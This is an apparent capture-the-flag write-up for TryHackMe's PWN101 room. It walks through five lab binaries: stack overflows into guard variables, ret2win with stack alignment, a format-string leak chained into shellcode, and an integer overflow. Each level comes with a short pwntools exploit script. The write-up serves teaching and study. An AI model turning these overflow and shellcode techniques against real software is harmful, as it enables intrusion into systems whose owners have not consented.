PWN101 is TryHackMe's introduction to Linux binary exploitation: ten x86-64 ELF
binaries, each isolating one primitive. This writeup walks the first five: a stack
overflow that clobbers a guard variable, a two-guard variant, a `ret2win` that has to
respect 16-byte stack alignment, a format-string leak feeding into shellcode, and an
integer overflow. Every solve is a short `pwntools` script; the point is the *why*, not
the payload length. Flags are redacted per TryHackMe's writeup policy.

## Setup

Each challenge is a networked binary on the target box. I pulled each ELF locally to
inspect it before touching the remote service:

```bash
checksec ./pwn101        # what protections are on?
```

Working `pwntools` skeleton reused across all levels:

```python
from pwn import *
context.arch = 'amd64'
r = remote('<TARGET_IP>', 9001)   # port = 9000 + level
```

## pwn101: stack overflow into a guard variable

The binary reads far more into a stack buffer than it can hold, and gates the win on a
local integer that must **not** equal its initialised sentinel (`0x539`). Overflowing the
buffer walks over that guard; any value other than the sentinel flips the check.

```python
r.recvuntil(b'briyani:')
r.sendline(b'A' * 80)          # overrun the buffer, smash the guard int at [rbp-0x4]
r.sendline(b'echo PWNED; ls -la; id')
```

The lesson that carries forward: **a "check" living on the stack next to an unbounded
read isn't a check.** Offset found by watching where the sentinel sits relative to the
buffer in the disassembly.

## pwn102: two guards, exact values

Same shape, but the win path compares **two** locals at different offsets, each against a
specific constant. This is where you stop spraying `A`s and place bytes precisely:

```python
# buffer at rbp-0x70; guard A at rbp-0x8 (offset +104), guard B at rbp-0x4 (offset +108)
payload = b'A'*104 + p32(0xc0d3) + p32(0xc0ff33)
r.sendline(payload)
```

Getting the two offsets right is the whole challenge: one byte off and the second guard
holds its original value.

## pwn103: ret2win with alignment

No convenient guard; here you overwrite the saved return address to jump to an
`admins_only` function. The catch that trips most people: modern glibc uses `movaps`,
which **faults if the stack isn't 16-byte aligned** at the call. Dropping a bare `ret`
gadget before the target realigns the stack:

```python
RET = 0x40158b     # a lone `ret`, used purely to fix 16-byte alignment
r.sendline(b'A'*40 + p64(RET) + p64(0x401554))   # pad → align → win()
```

If your ret2win "should work" but crashes inside a libc call, alignment is the first
thing to check.

## pwn104: format string leak → shellcode

The binary prints user input through `printf` with no format specifier, so a `%p` leaks a
live stack address: specifically the address of the input buffer itself. Leak it, then
write shellcode into that buffer and return to it:

```python
data = r.recvuntil(b'%p'); data += r.recv()
buf = int(re.search(rb'0x[0-9a-fA-F]+', data).group(0), 16)   # leaked buffer address
sc  = asm(shellcraft.amd64.linux.sh())
r.sendline(sc.ljust(88, b'\x90') + p64(buf))                  # shellcode + NOPs + ret→buf
```

Two primitives chained: the format string defeats ASLR for this one buffer, and the
overflow redirects execution into it. The NOP sled absorbs any small offset error in the
leak.

## pwn105: integer overflow

No memory corruption at all: a signed 32-bit accumulator. The win requires a negative
total, but the input validation only rejects negative *inputs*. Two large positive values
whose sum exceeds `INT_MAX` wrap to negative:

```python
r.sendline(b'2000000000')   # both inputs pass the ">= 0" check…
r.sendline(b'2000000000')   # …but 4e9 overflows int32 → negative → win
```

A reminder that "validated the input" and "validated the result" are different claims: the same class of bug I later ran into upstream in a VAT-number library.

## Takeaways

- Levels 1-2: a security decision stored next to an unbounded write is not enforced.
- Level 3: control-flow hijacks fail on alignment before they fail on logic: carry a
  spare `ret`.
- Level 4: an info leak is worth as much as the overflow; chain them.
- Level 5: overflow the *value*, not the buffer: check results, not just inputs.
